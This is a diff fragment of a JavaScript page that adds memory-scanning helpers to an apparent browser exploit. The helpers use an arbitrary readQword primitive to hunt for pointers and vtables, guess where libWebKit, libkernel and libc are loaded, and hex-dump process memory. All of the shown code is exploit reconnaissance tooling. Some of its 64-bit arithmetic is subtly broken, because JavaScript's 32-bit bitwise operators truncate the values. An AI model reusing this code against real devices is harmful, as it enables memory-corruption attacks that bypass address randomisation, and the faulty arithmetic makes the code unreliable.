+    printFooter();
 
     scannerPhase = 2;
+}
+
+function describeQword(val) {
+    if (val === 0) return "(zero)";
+    if (isPlausibleVtable(val)) return "[VTABLE CANDIDATE]";
+    if (isPlausiblePointer(val)) return "[POINTER]";
+    var low32 = val & 0xFFFFFFFF;
+    if (low32 > 0x4000 && low32 < 0x08000000 && (low32 & 0xF) === 0) return "[StructureID?]";
+    if (val > 0x10000000000 && val < 0x11000000000) return "[HEAP ADDR]";
+    return "";
+}
+
+function distance(a, b) {
+    var d = a > b ? a - b : b - a;
+    if (d < 0x1000) return "~" + hex(d);
+    if (d < 0x100000) return "~" + hex(d >> 10) + "KB";
+    return "~" + hex(d >> 20) + "MB";
+}
+
+function scanPointers(start, size, max) {
+    var found = [];
+    for (var a = start; a < start + size && found.length < max; a += 8) {
+        try {
+            var v = readQword(a);
+            if (isPlausiblePointer(v)) found.push({ addr: a, ptr: v });
+        } catch(e) {}
+    }
+    return found;
+}
+
+function scanVtables(start, size, max) {
+    var found = [];
+    for (var a = start; a < start + size && found.length < max; a += 8) {
+        try {
+            var v = readQword(a);
+            if (isPlausibleVtable(v)) {
+                var entry = 0;
+                try { entry = readQword(v); } catch(e) {}
+                var baseGuess = v & 0xFFFFFFFFF000;
+                var libName = "unknown";
+                if (baseGuess >= 0x10040000000 && baseGuess < 0x10050000000) libName = "libWebKit?";
+                else if (baseGuess >= 0x10050000000 && baseGuess < 0x10060000000) libName = "libkernel?";
+                else if (baseGuess >= 0x10020000000 && baseGuess < 0x10030000000) libName = "libc?";
+                found.push({ addr: a, vtable: v, firstEntry: entry, libGuess: libName });
+            }
+        } catch(e) {}
+    }
+    return found;
+}
+
+function hexDump(startAddr, size) {
+    for (var off = 0; off < size; off += 16) {
+        var line = hex(startAddr + off) + " | ";
+        var ascii = " | ";
+        for (var b = 0; b < 16 && (off + b) < size; b += 8) {
+            try {
+                var qw = readQword(startAddr + off + b);
+                var bytes = [qw&0xFF, (qw>>8)&0xFF, (qw>>16)&0xFF, (qw>>24)&0xFF,
+                             (qw>>32)&0xFF, (qw>>40)&0xFF, (qw>>48)&0xFF, (qw>>56)&0xFF];
+                for (var i = 0; i < 8 && (off + b + i) < size; i++) {
+                    line += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16) + " ";
+                    ascii += (bytes[i] >= 32 && bytes[i] < 127) ? String.fromCharCode(bytes[i]) : ".";
+                }
+            } catch(e) {
+                line += "?? ?? ?? ?? ?? ?? ?? ?? ";
+                ascii += "????????";
+            }
+        }
+        printLine(line + ascii);
+    }
 }
 </script>
 </body>
